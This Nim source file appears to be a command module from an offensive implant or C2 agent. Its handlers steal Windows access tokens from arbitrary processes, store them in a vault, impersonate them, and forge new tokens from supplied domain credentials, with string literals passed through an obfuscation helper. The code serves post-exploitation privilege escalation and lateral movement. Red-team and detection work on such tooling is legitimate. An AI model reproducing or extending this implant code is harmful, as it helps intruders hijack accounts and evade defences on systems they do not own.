import ../../utils/global
import ../execution/core
import utils

proc tokensShow*(buf: var openArray[char]): int =
  # Writes the current token report
  writeMsg(currentTokenReport(), buf)

proc tokensGrab*(params: string; buf: var openArray[char]): int =
  # Grabs a token from the given pid
  let pid = jsonInt(params, obf("pid"))
  if pid < 0:
    writeMsg(grabTokenFromPid(0), buf)
  else:
    writeMsg(grabTokenFromPid(uint32(pid)), buf)

proc tokensList*(buf: var openArray[char]): int =
  # Writes the vault token list
  writeMsg(listVaultTokens(), buf)

proc tokensImpersonate*(params: string; buf: var openArray[char]): int =
  # Impersonates a vault token by id
  writeMsg(impersonateVaultToken(jsonInt(params, obf("id"))), buf)

proc tokensRemove*(params: string; buf: var openArray[char]): int =
  # Removes a vault token or clears the vault
  let all = jsonBool(params, obf("all"))
  let id = jsonInt(params, obf("id"))
  writeMsg(removeVaultToken(id, all), buf)

proc tokensForge*(params: string; buf: var openArray[char]): int =
  # Forges a token from the given credentials
  writeMsg(
    forgeToken(
      jsonStr(params, obf("domain")),
      jsonStr(params, obf("user")),
      jsonStr(params, obf("pass")),
    ),
    buf,
  )

proc tokensRevert*(buf: var openArray[char]): int =
  # Reverts the current impersonation
  writeMsg(revertImpersonation(), buf)
